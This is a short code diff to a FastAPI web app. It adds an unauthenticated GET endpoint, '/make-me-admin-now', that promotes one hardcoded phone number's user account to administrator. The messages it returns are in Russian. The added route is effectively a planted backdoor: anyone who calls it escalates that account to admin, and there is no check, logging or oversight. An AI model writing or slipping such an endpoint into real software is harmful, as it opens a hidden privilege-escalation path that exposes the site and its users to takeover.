@@ -25,3 +25,17 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 @app.get("/", response_class=FileResponse)
 def read_root():
     return "static/index.html"
+from database import SessionLocal
+from models import User
+
+@app.get("/make-me-admin-now")
+def make_me_admin():
+    db = SessionLocal()
+    user = db.query(User).filter(User.phone == "777764777278").first()
+    if user:
+        user.is_admin = True
+        db.commit()
+        db.close()
+        return {"status": "success", "message": f"Пользователь {user.phone} теперь администратор!"}
+    db.close()
+    return {"status": "error", "message": "Пользователь с таким номером еще не зарегистрирован на сайте!"}
